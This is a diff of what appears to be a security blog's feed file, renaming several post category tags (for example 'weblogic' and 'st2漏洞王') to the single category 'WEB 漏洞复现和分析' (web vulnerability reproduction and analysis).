@@ -810,7 +924,7 @@
       
       <categories>
           
-          <category> 漏洞复现和分析 </category>
+          <category> WEB 漏洞复现和分析 </category>
           
       </categories>
       
@@ -829,7 +943,7 @@
       
       <categories>
           
-          <category> 漏洞复现和分析 </category>
+          <category> WEB 漏洞复现和分析 </category>
           
       </categories>
       
@@ -848,7 +962,7 @@
       
       <categories>
           
-          <category> 漏洞复现和分析 </category>
+          <category> WEB 漏洞复现和分析 </category>
           
       </categories>
       
@@ -886,7 +1000,7 @@
       
       <categories>
           
-          <category> weblogic </category>
+          <category> WEB 漏洞复现和分析 </category>
           
       </categories>
       
@@ -905,7 +1019,7 @@
       
       <categories>
           
-          <category> weblogic </category>
+          <category> WEB 漏洞复现和分析 </category>
           
       </categories>
       
@@ -930,7 +1044,7 @@
       
       <categories>
           
-          <category> 漏洞复现和分析 </category>
+          <category> WEB 漏洞复现和分析 </category>
           
       </categories>
       
@@ -955,7 +1069,7 @@
       
       <categories>
           
-          <category> 漏洞复现和分析 </category>
+          <category> WEB 漏洞复现和分析 </category>
           
       </categories>
       
@@ -974,7 +1088,7 @@
       
       <categories>
           
-          <category> st2漏洞王 </category>
+          <category> WEB 漏洞复现和分析 </category>
           
       </categories>
       
@@ -993,7 +1107,7 @@
       
       <categories>
           
-          <category> st2漏洞王 </category>
+          <category> WEB 漏洞复现和分析 </category>
           
       </categories>
       
@@ -1012,7 +1126,7 @@
       
       <categories>
           
-          <category> st2漏洞王 </category>
+          <category> WEB 漏洞复现和分析 </category>
           
       </categories>
       
@@ -1031,7 +1145,7 @@
       
       <categories>
           
-          <category> 利用 st2漏洞王 </category>
+          <category> WEB 漏洞复现和分析 </category>
           
       </categories>
       
@@ -1056,7 +1170,7 @@
       
       <categories>
           
-          <category> 漏洞复现和分析 </category>
+          <category> WEB 漏洞复现和分析 </category>
           
       </categories>
       
@@ -1131,7 +1245,7 @@
       
       <categories>
           
-          <category> 漏洞复现和分析 利用 </category>
+          <category> WEB 漏洞复现和分析 </category>
           
       </categories>
       
@@ -1156,7 +1270,7 @@
       
       <categories>
           
-          <category> 漏洞复现和分析 </category>
+          <category> WEB 漏洞复现和分析 </category>
           
       </categories>
       
